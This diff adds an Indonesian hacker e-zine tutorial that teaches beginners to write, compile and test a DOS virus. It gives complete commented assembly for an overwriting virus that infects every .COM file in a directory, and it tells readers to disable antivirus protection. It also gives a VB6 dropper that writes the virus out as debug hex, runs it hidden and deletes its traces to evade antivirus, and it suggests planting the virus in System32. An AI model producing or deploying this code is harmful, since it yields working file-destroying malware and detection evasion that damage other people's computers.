@@ -1,0 +1,453 @@
+
+               E C H O   E - Z I N E   I s s u e   # 1 0               
+
+--------------[ Virus Assembly Menggunakan TASM dan TLINK ]---------------
+--------------------------------------------------------------------------
+----------------------[ dR4GGy <dR4GGy@yahoo.com> ]-----------------------
+
+
+--- 00 // Intro ----------------------------------------------------------
+
+Artikel ini ditulis mengingat betapa susahnya waktu pertama kali belajar 
+assembly dan penulis ingin berbagi rasa dan pengalaman bersama rekan-rekan
+yang lain. Diharapkan setelah membaca artikel ini, para pemula yang ingin
+belajar tentang pemrograman virus dapat mengerti dan membuat program virus
+dengan kreasinya sendiri.
+
+Yang harus dipersiapkan terlebih dahulu adalah:
+
+ - Membuat satu folder pada C:\ dengan nama LAB atau nama lain yang 
+   diinginkan. Salin debug.exe (gunakan fasilitas search pada folder
+   WINDOWS) ke dalam folder tersebut.
+ - Download dan install program TASM dan TLINK (silakan menggunakan
+   Google search engine)
+ - Install aplikasi VB 6.0
+
+--- 01 // Source code ----------------------------------------------------
+
+Berikut adalah program virus yang ditulis dalam bahasa assembly beserta
+komentar agar dapat mempermudah proses pembelajaran.
+
+<++ TESVIRUS.ASM ++>
+; PROG   : TESVIRUS.ASM [Trivial Based] based on TOAD
+; Efek   : menginfeksi semua file berakhiran .COM yg ada didalam folder
+
+draggy	segment	; nama segmen (awal dari segmen), 
+		; umumnya menggunakan code segment
+
+assume 	cs:draggy,ds:draggy	; register cs dengan ds ke segment
+	org 	100h		; daftar ke memori 100hex atau 256 bytes
+				; untuk mengcompile program ke format .com
+
+TesVirus proc	near		; identitas virus/prosedur
+
+; ------------------------------------------------------------------------
+
+mulai:		; nama label (bisa ditulis dgn nama apa saja,
+		; terserah anda yg penting anda mengerti)
+
+mov  ah,4eh	; move nilai 4e hex ke ah untuk general register
+
+; ------------------------------------------------------------------------
+
+cari_korban:	; nama label
+
+	xor cx,cx	; cx = 0 untuk general register utk set atribut 
+			; file = normal, bisa juga dengan menggunakan
+			; mov cx,0 tetapi dapat membuat ukuran program
+			; menjadi lebih besar 3 bytes
+
+	lea dx,comsig	; L<oad> E<ffective> A<ddress> dari comsig ke dx 
+			; atau move string ke dx untuk mencari 
+			; spesifik file yg akan diinfeksi, 
+			; bisa juga dengan menggunakan mov dx, offset
+			; comsig
+
+	int 21h		; eksekusi fungsi yang sudah di set
+			; untuk lebih lengkapnya, lihat tabel interrupt
+
+	jc jejakpendekar ; jc = jump if carry (jika program telah
+			; terinfeksi maka eksekusi rutin jejakpendekar
+			; (rutin untuk menampilkan pesan) jika carry 
+			; flag = 1 tetapi bila flag = 0 maka 
+			; jump ignore (rutin jejakpendekar tidak
+			; dieksekusi) dan lanjutkan ke baris berikut
+
+; ------------------------------------------------------------------------
+
+buka_bajunya:		; nama label
+
+	mov ax,3d02h	; asumsi program telah menemukan file yg akan
+			; diinfeksi maka 3d02h diload ke AX
+			; karena AX tipe registernya 16-bit yang isinya 
+			; masing-masing 8 bit AH & AL maka AH=3dh & AL=02h, 
+			; dengan kata lain 3d hex diload ke AH
+			; AL diload dengan 02 hex utk membuka file 
+			; dengan mode read/write.
+
+			; note: - AL = 02h --> open the file in 
+			;                      read/write mode
+			; 	- AL = 00h --> open it in read only 
+			; 	- AL = 01h --> write only
+
+	mov	dx,9eh	; load ASCii string ke dx untuk nama file yg
+			; akan diinfeksi letaknya ada di PSP di bagian
+			; D<ata>T<ransfer>A<rea>.
+			; PSP start di 00 hex,DTA start di 80 hex,
+			; file name ada di 1e hex di awal DTA
+			; jadi total offset ini : 1e+80=9e hex, 
+
+	int	21h	; eksekusi
+
+; ------------------------------------------------------------------------
+
+perkosa_korban:		; nama label
+
+	xchg  bx,ax	; di rutin sebelumnya pada saat 
+			; file dibuka(open), komputer 
+			; menempatkan perlakuan unik
+			; (unique file handle) dan disimpan 
+			; ke dalam AX. Kita membutuhkan file handle 
+			; itu di BX untuk fungsi write record 
+			; jadi anda dapat menggunakan Exchange(xchg) AX 
+			; ke BX {xchg bx,ax} atau
+			; bisa juga dengan menggunakan mov bx,ax tetapi 
+			; ukuran program menjadi lebih besar 1 byte, 
+			; [biasanya untuk pembuatan program virus, kita
+			; harus dapat mengoptimalkan kode program agar
+			; program yang dihasilkan ukurannya lebih kecil 
+			; sehingga lebih hemat memori dan efektif.]
+
+	mov  ah,40h	; load 40 hex ke AH
+
+	mov  cx,offset target - offset mulai ; perintahkan komputer 
+			; agar menghitung jarak antara
+			;  offset mulai dengan offset target agar
+			;  dapat diketahui berapa banyak bytes
+			;  yg akan ditulis(write).
+			;  jadi CX harus diload dgn jumlah bytes
+			;  yg akan ditulis
+
+	lea  dx,mulai	; load alamat mulai ke dx
+
+	int  21h	; eksekusi
+
+; ------------------------------------------------------------------------
+
+balikin_bajunya:	; nama label 
+
+	mov  ah,3eh	; setelah file telah terinfeksi maka tutup file 
+			; korban (load 3eh ke ah) agar program virus ini
+			; dapat mulai mencari program lain untuk diinfeksi
+
+	int  21h	; eksekusi
+
+	mov  ah,4fh	; load 4f ke AH
+
+	jmp  cari_korban ; looping, lompat ke label cari_korban
+			;   sampai ada file yang flagnya=1
+
+; ------------------------------------------------------------------------
+
+jejakpendekar:		; nama label 
+
+			; rutin ini berguna untuk menampilkan pesan,
+			; juga sebagai tanda program virus telah selesai.
+			; jadi jika anda tidak ingin menggunakan rutin ini
+			; tidak apa-apa karena program virus ini masih 
+			; dapat berjalan
+
+	mov  ah,09h	; servis ke 9 untuk mencetak string
+
+	mov  dx,offset pesanku	; teks yg akan didisplay pada layar harus
+			; diload dahulu ke dx (Data Register)
+			; jadi ambil alamat Offset pesanku
+
+	int  21h	; eksekusi
+
+; ------------------------------------------------------------------------
+
+keluar:
+
+	int  20h	; finish! kembali ke DOS.
+			; terminate operation tanpa menset register.
+			; cara lain terminate dgn menset register adalah:
+			; mov ax,4c00h menggunakan int 21h 
+			; (Keterangan: 00=exit without error)
+
+;--------------------------------------------------------------------------------
+
+comsig	db  "*.com",0	; define data = comsig, 0 = akhir string
+			;   comsig = signature file COM
+
+pesanku	db  'semua file *.com di direktori ini sudah diinfeksi',10,13
+			; $ = akhir string
+			; 10,13 = pindah kebaris berikutnya
+	db  'selamat anda berhasil membuat virus :)',10,13
+	db  'kritik dan saran eMail ke dR4GGy@yahoo.com...',10,13
+ 	db  'thx to Horny Toad for all the lessons u teach me :)',10,13,'$'
+
+target	label  near	; label didalam prosedur TesVirus yang berguna 
+			;  utk menetapkan jarak/besar program virus
+
+TesVirus       endp	; akhir procedure
+
+draggy  ends		; akhir segmen
+
+	end    mulai	; akhir mulai (mulai = kode pertama yg dieksekusi
+			; komputer yang berada didalam segmen draggy)
+
+<-- TESVIRUS.ASM -->
+
+--- 02 // Note -----------------------------------------------------------
+
+  01. Compile dengan menggunakan TASM 2.01 dan Tlink
+
+  02. Untuk lebih jelasnya, anda bisa mencari referensi lain tentang 
+      bahasa assembly
+
+  03. Untuk melihat daftar interrupt lengkap anda bisa ke Ralph Brown's 
+      website alamatnya di : 
+      http://www.cs.cmu.edu/afs/cs.cmu.edu/user/ralf/pub/WWW/
+      download:  Interrupt 61a,61b,61c,61d,61e,61f (semuanya dalam Zip)
+
+--- 03 // Mengcompile ----------------------------------------------------
+
+  01. Matikan/disable fungsi Auto Protect dari program AntiVirus yang anda 
+      gunakan karena virus yang dibuat ini termasuk 'simple virus' sehingga
+      virus ini mudah didetect oleh program AntiVirus.
+
+  02. Salin program TASM dan TLINK ke folder C:\LAB
+
+  03. Salin source code TESVIRUS ke dalam text editor.
+
+  04. Simpan dengan nama yang disukai dengan ekstensi ASM. Contoh: 
+      TESVIRUS.ASM
+
+  05. Buat batchfile bikinvirus pada folder C:\LAB
+
+<++ bikinvirus ++>
+@ECHO OFF
+TASM %1.ASM
+TLINK /T %1.OBJ
+del %1.map
+del %1.obj
+<-- bikinvirus -->
+ 
+  06. Jalankan DOS. Start -> Run -> cmd    
+
+  07. Pindah ke direktori C:\LAB dan jalankan perintah bikinvirus
+
+      Microsoft Windows XP [Version 5.1.2600]
+      (C) Copyright 1985-2001 Microsoft Corp.
+
+      C:\LAB>bikinvirus TESVIRUS
+  
+      Turbo Assembler  Version 2.01  Copyright (c) 1988, 1990 
+      Borland International
+
+      Assembling file:   TESVIRUS.ASM
+      Error messages:    None
+      Warning messages:  None
+      Passes:            1
+      Remaining memory:  442k
+
+      Turbo Link  Version 3.01 Copyright (c) 1987, 1990 Borland 
+      International
+
+  08. Program TESVIRUS telah dibuat. Jika ada kesalahan periksa 
+      kembali kesalahan penulisan pada kode program, batchfile,
+      atau perintah di DOS.
+
+--- 04 // Testing --------------------------------------------------------
+
+Setelah anda berhasil membuat program virus bernama TESVIRUS.COM, 
+tentunya anda ingin menguji apakah virus yang telah dibuat 
+berhasil atau tidak. Anda tak perlu khawatir dengan virus yang 
+telah dibuat tadi karena virus ini tidak akan merusak sistem 
+di komputer anda selama anda tidak menempatkan virus ini difolder 
+Windows atau system atau system32.
+
+Untuk menguji virus TESVIRUS.COM terlebih dahulu anda harus 
+membuat satu 'simple' program .com yang tidak berguna [contoh 
+KORBAN.COM] kemudian catat ukuran asli dari file KORBAN.COM,
+setelah itu letakkan program KORBAN.COM tersebut ke folder C:\LAB. 
+
+Masuk ke DOS prompt dan jalankan program TESVIRUS.
+
+Kemudian, bandingkan size program KORBAN.COM sebelum dan sesudah
+program TESVIRUS dijalankan. Jika terjadi perubahan maka TESVIRUS
+telah berhasil menjalankan tugasnya.
+
+Jika anda bingung bagaimana membuat sebuah program KORBAN.COM disini
+penulis menyertakan source code untuk program tersebut dan akan 
+dicompile dengan menggunakan program debug.exe.
+
+Program ini hanyalah sebuah program untuk menampilkan huruf "AA" jika
+dijalankan dengan ukuran file aslinya = 14 KB.
+
+Setelah anda mengcopy program debug.exe ke folder C:\LAB, jalankan 
+text editor dan copy-kan source code dibawah ini:
+
+<++ KORBAN.TXT ++>
+N KORBAN.COM
+E 0100 B4 02 B2 41 CD 21 B4 02 B2 41 CD 21 CD 20
+RCX
+000E
+W
+Q
+
+<-- KORBAN.TXT ++>
+
+Masuk ke dalam DOS prompt dan compile
+
+  Microsoft Windows XP [Version 5.1.2600]
+  (C) Copyright 1985-2001 Microsoft Corp.
+
+  C:\LAB>debug < KORBAN.TXT
+  -N KORBAN.COM
+  -E 0100 B4 02 B2 41 CD 21 B4 02 B2 41 CD 21 CD 20
+  -RCX
+  CX 0000
+  :000E
+  -W
+  Writing 0000E bytes
+  -Q
+
+  C:\LAB>  
+
+
+--- 05 // Mengatasi TESVIRUS.COM -----------------------------------------
+
+- Delete program TESVIRUS.COM termasuk file KORBAN.COM (yang sudah 
+  terinfeksi).
+
+- Jika belum bisa hilang, enable kembali auto protect program 
+  AntiVirus anda kemudian scan dan quarantine, setelah itu anda 
+  dapat men-delete TESVIRUS.COM dari dialog quarantine [penulis memakai 
+  program Norton AntiVirus dengan update Virus Definition tgl. 24 
+  Desember 2004].
+
+- Jika masih belum bisa anda dapat me-reverse/membalikkan logika dari 
+  program TESVIRUS.COM untuk membersihkan file-file yang telah
+  terinfeksi.
+
+
+
+--- 06 // Tip dan Trik Membuat Virus Generator ---------------------------
+
+Ini adalah hasil iseng penulis waktu lagi menulis program dan
+ternyata dengan menggunakan cara ini kita dapat mengecoh program 
+AntiVirus. Triknya adalah dengan membuat suatu program yang 
+men-drop/membuat file .dbg, .bat kesebuah drive dikomputer 
+kemudian program menjalankan file .bat yang telah dihasilkan 
+tadi untuk membuat program .com(virus) di drive tersebut. 
+Setelah program melaksanakan tugasnya maka file .dbg akan otomatis 
+dihapus dari komputer.
+
+Disini penulis tidak akan membahas tentang cara bekerja dengan 
+menggunakan VB, untuk lebih jelasnya anda dapat membaca referensi 
+VB 6.0 dari buku, artikel atau anda dapat membeli CD MSDN yang 
+berisi Help dan contoh program pada VB 6.0 [keep up the hard 
+work my friend :)]
+
+Pada program yang akan dibahas ini file yang akan dihasilkan/
+di-drop ke drive C:\ adalah file tv.dbg, tv.bat dan TESVIRUS.com. 
+Program ini di-compile menggunakan VB 6.0 jadi sebelumnya anda 
+harus menginstall  VB 6.0 dikomputer anda :)
+
+Virus yang akan dihasilkan adalah virus TESVIRUS.COM yaitu virus 
+yang sama dengan virus yang telah anda buat diatas, perbedaannya 
+adalah program ini akan terus menghasilkan virus TESVIRUS.COM 
+di drive C:\ jika program ini dijalankan.
+
+Terlebih dahulu anda memilih tipe 'standard exe' di VB dan 
+Add 1 module pada program VB.
+
+Salin code berikut pada text editor VB.
+
+<++ TESVIRUS2 ++>
+' kode di module
+Public Function DropVir()
+  On Error Resume Next
+  Dim x, tvBat As String
+  x = "C:\tv.dbg"
+  Open x For Output As #1
+    Print #1, "N C:\TESVIRUS.COM"
+    Print #1, "E 0100 B4 4E 33 C9 BA 2F 01 CD 21 72 1B B8 02 3D BA 9E"
+    Print #1, "E 0110 00 CD 21 93 B4 40 B9 EA 00 BA 00 01 CD 21 B4 3E"
+    Print #1, "E 0120 CD 21 B4 4F EB DC B4 09 BA 35 01 CD 21 CD 20 2A"
+    Print #1, "E 0130 2E 63 6F 6D 00 73 65 6D 75 61 20 66 69 6C 65 20"
+    Print #1, "E 0140 2A 2E 63 6F 6D 20 64 69 20 64 69 72 65 6B 74 6F"
+    Print #1, "E 0150 72 69 20 69 6E 69 20 73 75 64 61 68 20 64 69 69"
+    Print #1, "E 0160 6E 66 65 6B 73 69 0A 0D 73 65 6C 61 6D 61 74 20"
+    Print #1, "E 0170 65 6C 6F 20 62 65 72 68 61 73 69 6C 20 62 69 6B"
+    Print #1, "E 0180 69 6E 20 76 69 72 75 73 20 70 65 72 74 61 6D 61"
+    Print #1, "E 0190 20 6B 61 6D 75 20 3A 29 0A 0D 6B 72 69 74 69 6B"
+    Print #1, "E 01A0 20 64 61 6E 20 73 61 72 61 6E 20 65 4D 61 69 6C"
+    Print #1, "E 01B0 20 6B 65 20 64 52 34 47 47 79 40 79 61 68 6F 6F"
+    Print #1, "E 01C0 2E 63 6F 6D 2E 2E 2E 0A 0D 54 65 73 56 69 72 75"
+    Print #1, "E 01D0 73 20 54 72 69 76 69 61 4C 20 2D 20 64 52 34 47"
+    Print #1, "E 01E0 47 79 20 2D 20 30 34 0A 0D 24"
+    Print #1, "RCX"
+    Print #1, "00EA"
+    Print #1, "W"
+    Print #1, "Q"
+  Close #1
+  tvBat = "C:\tvBat.bat"
+  Open tvBat For Output As #1
+    Print #1, "@echo off"
+    Print #1, "debug < C:\tv.dbg"
+    Print #1, "del C:\tv.dbg"
+  Close #1    
+ Shell "C:\tvBat.bat", vbNormalFocus	' atau gunakan vbHide agar 
+					 ' proses dilakukan secara
+                                         ' background
+End Function
+
+' kode di form
+Private Sub Form_Load()
+  Call DropVir
+  Unload Me
+End Sub
+<-- TESVIRUS2 -->
+
+Setelah itu compile program anda dan jalankan, jika berhasil maka 
+sekarang di drive C: akan muncul program TESVIRUS.com. Karena 
+program ini dibuat dengan cepat jadi ada beberapa kekurangannya 
+seperti program ini tidak mencek kembali apakah file TESVIRUS.COM 
+telah ada di drive C:\, untuk itu anda mungkin dapat menambahkan 
+fungsi 'FileExists' untuk mencek file tersebut atau anda dapat 
+berkreasi sendiri dengan menggunakan cara anda sendiri untuk berkreasi 
+seperti men-drop virus ke folder C:\Windows\System32
+
+
+--- 07 // Final Word -----------------------------------------------------
+
+"ilmu itu bukan untuk dibaca tapi untuk dipraktekkan."
+
+"jangan takut untuk mencoba, trial n' error is the best lessons 
+ in the world"
+
+Happy programming n' bye ...
+
+
+
+--- 08 // Greetz ---------------------------------------------------------
+
+echo|staff (untuk memberikan tempat bagi artikel ini), St'o (buku
+assemblynya bagus banget), echo'ers dan newbie_hackers, Mikele (my 
+only bro for 'ur college sacrifice for me, many thx for u mike),
+Tingsing, eLiTe Gazo, Glacier Excardon, dede, adjie, Bondes, Menteng,
+anak FISIP '98c, Horny TOAD (for good lessons on assembly). 
+
+
+--- 09 // Referensi ------------------------------------------------------
+
+  01. Forum ECHO VIRUS
+  02. http://www.codebreakers.org/
+  03. S'to, Pemograman Bahasa Assembly, edisi online v1.0
+  04. Google, keyword: debug tutorial
+  05. http://www.cs.cmu.edu/afs/cs.cmu.edu/user/ralf/pub/WWW/
+
+-------------------------------------------------------------- EOF //-----
